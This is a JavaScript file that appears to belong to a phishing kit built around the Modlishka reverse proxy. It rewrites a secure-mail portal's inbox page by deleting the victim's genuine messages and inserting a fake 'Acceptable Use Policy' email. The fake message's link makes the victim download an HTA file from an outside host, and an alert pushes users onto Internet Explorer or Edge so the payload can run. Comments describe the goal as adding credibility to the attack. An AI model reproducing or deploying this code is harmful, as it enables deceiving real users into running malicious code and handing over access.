var redirected = false
var interval_id
interval_id = setInterval(updateContent,1000)
    
function updateContent(){

    loc = document.location.href.toString()

    if (loc.endsWith("wmWs.html")) {

        // Redirect back to the inbox
        if (!redirected){
            redirected = true
            loc = loc.replace("wmWs.html","wmInbox.html")
            document.location = loc
        }

    } else if (loc.endsWith("wmInbox.html")) {

        try {
            table = document.getElementById("files-inbox")
            if (table) {
                tbody = table.getElementsByTagName("tbody")[0]
            } else {
                table = document.getElementById("inbox")
                tbody = table.getElementsByTagName("tbody")[0]
                var i
                elements = tbody.getElementsByTagName("tr")
                for (i=0;i<elements.length;i++){elements[i].remove()}
                table.id = "files-inbox"
                table.setAttribute("class",
                    "files-table pack-table selected-table pageable")
            }
        }
        catch(err){
            return -1
        }

        //// INJECT EXECUTION GUIDANCE ////
        /* 
         * This part will redraw the final landing page such that
         * an execution guidance section will be introduced. This
         * helps the user execute the hta file and adds credibility
         * to the attack.
         * */

//        ifr = document.createElement("iframe")
//        // TODO: UPDATE THIS URL TO POINT AT IFRAME CONTENT
//        ifr.src = "https://www.sourceforcontent.html/if.html"
//        ifr.style="border:none;width:100%;"
//        tnav = document.getElementsByClassName("tablenav")
//        if (tnav.length > 0) {
//            tnav[0].appendChild(ifr)
//        }
    
        //// VARIABLES ////
        
        // link configuration
        // UPDATE THIS URL TO POINT AT HTA FILE
        link_href = "https://www.sourceforhtafile.com/policy.hta"

        // TODO: UPDATE TO MATCH PRETEXT/RUSE
        link_content = "Acceptable Use Policy"
        
        // sender configuration
        // TODO: UPDATE THIS WITH LEGITIMATE VALUE
        sender_email = "sender@domain.com"
        
        // date configuration
        // TODO: UPDATE TIMESTAMPS
        receive_date = "6 Aug 2019"
        receive_time = "08:34:43"
        expire_date  = "14 August 2019"
        // TODO: UPDATE THIS TO MATCH THE TERMINATE STRING IN MODLISHKA PROFILE TO FORCE REDIRECTION
        force_redirect = 'https://www.apexorigin.com/courier/web/1000@/wmLoginexec.html?trigger=true'        
        //// END VARIABLES ////
        
        //////////////////////////////////////////////
        
        //// START TABLE CONSTRUCTION ////
        
        // Construct the new table row
        link_row = document.createElement("tr")
        link_row.setAttribute("class","odd")
        
        // div mail-col
        div = document.createElement("div")
        div.setAttribute("class","mail-files")
        
        //// HANDLE MAIL ICON ////
        
        // span element containing icon
        span = document.createElement("span")
        span.setAttribute("class","ico ico-letter")
        span.innerText = "&nbsp;"
        
        // p element containing span element
        p = document.createElement("p")
        p.setAttribute("class","fsubj")
        p.appendChild(span)
        div.appendChild(p)
        
        //// HANDLE LINK ////
        
        link_span = document.createElement("span")
        link_span.setAttribute("class","tooltip")
        link_span.setAttribute("title",link_content)
        link_span.setAttribute("id","fn_1")
        link_span.innerText = link_content
        
        // create the clickable link
        link = document.createElement("a")
        link.setAttribute("class","left")
        // link.href = link_href
        link.setAttribute("onclick","javascript:document.location='"+link_href+"';demo();")
        link.appendChild(link_span)
        
        // create the p element to hold the link
        // and append it to the div
        p = document.createElement("p")
        p.appendChild(link)
        div.appendChild(p)
        
        // Create cell values
        // Start with td main-col/div mail-files/div mail-col/p fsubj
        mail_td = document.createElement("td")
        mail_td.setAttribute("class","main-col")
        mail_td.appendChild(div)
        
        // Assemble the row
        link_row.appendChild(mail_td)
        
        //// ADD SENDER DATA ////
        sender_td = document.createElement("td")
        sender_td.innerText = sender_email
        link_row.appendChild(sender_td)
        
        //// ADD RECEIVED DATE/TIME ////
        receive_td = document.createElement("td")
        receive_td.setAttribute("class","datetime date")
        receive_td.appendChild(document.createTextNode(receive_date))
        receive_td.appendChild(document.createElement("br"))
        receive_td.appendChild(document.createTextNode(receive_time))
        link_row.appendChild(receive_td)
        
        //// ADD EXPIRE DATE/TIME ////
        expire_td = document.createElement("td")
        expire_td.setAttribute("class","date last")
        expire_td.innerText = expire_date
        link_row.appendChild(expire_td)
        
        deleteRows()
        
        // Redraw the emails table
        tbody.appendChild(link_row)
        clearInterval(interval_id)

    }
    
}

function deleteRows() {
    classes = ['odd','even']
    var i;
    for (i=0;i<2;i++) {
        rows = getRows(classes[i])
        var ii;
        for (ii=0;ii<rows.length;ii++){
            rows[ii].remove()
        }
    }
}

function getRows(cls){
    return document.getElementsByClassName(cls)
}

// Get IE or Edge browser version
//

function detectIE() {
var ua = window.navigator.userAgent;

// Test values; Uncomment to check result …
//
// IE 10
// ua = 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)';

// IE 11
// ua = 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko';

// Edge 12 (Spartan)
// ua = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0';

// Edge 13
// ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586';
//
var msie = ua.indexOf('MSIE ');
if (msie > 0) {
// IE 10 or older => return version number
    return parseInt(ua.substring(msie + 5, ua.indexOf('.', msie)), 10);
}

var trident = ua.indexOf('Trident/');
if (trident > 0) {
    // IE 11 => return version number
    var rv = ua.indexOf('rv:');
    return parseInt(ua.substring(rv + 3, ua.indexOf('.', rv)), 10);
}

var edge = ua.indexOf('Edge/');
if (edge > 0) {
    // Edge (IE 12+) => return version number
    return parseInt(ua.substring(edge + 5, ua.indexOf('.', edge)), 10);
}
    // other browser
    return false;
}

if (!detectIE()) {
    alert("Warning: This application requires Internet Explorer or Edge. Please close this browser and use a compatible version.")
}

function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
}

async function demo() {
      await sleep(2000);

      // Sleep in loop
       for (let i = 0; i < 5; i++) {
           if (i === 3)
                 await sleep(10000);
       }
       document.location=force_redirect;
}
